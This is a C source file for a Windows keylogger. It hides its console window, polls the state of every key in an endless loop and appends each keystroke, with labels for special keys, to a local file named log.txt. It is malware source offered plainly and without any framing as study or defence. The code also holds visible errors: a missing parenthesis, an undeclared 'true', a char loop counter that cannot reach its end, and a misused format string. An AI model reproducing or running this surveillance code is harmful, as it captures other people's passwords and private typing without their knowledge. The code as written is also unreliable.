#include<stdio.h>
#include <stdlib.h>
#include<windows.h>


#define FILEPATH "log.txt"


void LogKeys(int key, FILE *OutputFile){
	Sleep(10);
	printf("%d\n", key);
	switch (key){
		case VK_RETURN		: fprintf(OutputFile, "%s", "\n"); break; 
		case VK_CONTROL		: fprintf(OutputFile, "%s", "[CTRL]"); break;
		case VK_SHIFT		: fprintf(OutputFile, "%s", "[SHIFT]"); break;
		case VK_MENU		: fprintf(OutputFile, "%s", "[ALT]"); break;
		case VK_TAB			: fprintf(OutputFile, "%s", "[TAB]"); break;
		case VK_CAPITAL		: fprintf(OutputFile, "%s", "[CAPSLOCK]"); break;
		case VK_ESCAPE		: fprintf(OutputFile, "%s", "[ESC]"); break;
		case VK_SPACE		: fprintf(OutputFile, "%s", " "; break;
		case VK_PRIOR		: fprintf(OutputFile, "%s", "[PAGEUP]"); break;
		case VK_NEXT		: fprintf(OutputFile, "%s", "[PAGEDOWN]"); break;
		case VK_END			: fprintf(OutputFile, "%s", "[END]"); break;
		case VK_HOME		: fprintf(OutputFile, "%s", "[HOME]"); break;
		case VK_LBUTTON		: fprintf(OutputFile, "%s", "[LMB]"); break;
		case VK_RBUTTON		: fprintf(OutputFile, "%s", "[RMB]"); break;
		case VK_BACK		: fprintf(OutputFile, "%s", "[/b]"); break;
		case VK_LEFT		: fprintf(OutputFile, "%s", "<--"); break;
		case VK_RIGHT		: fprintf(OutputFile, "%s", "-->"); break;
		default				: fprintf(OutputFile, "%s", &key);
	}	
}
	


int main(){
	FreeConsole();
	char i;
	FILE *OutputFile = fopen(FILEPATH, "a+");
	while (true){
		// checking all the keys
		for (i = 1; i <= 255; i++){ 
			// When the i'th key is pressed (Actually most significant bit is 1 )
			if (GetAsyncKeyState(i) == -32767){ 
				LogKeys(i, OutputFile);
			}
		}
	}
	fclose(OutputFile);
	return 0;
}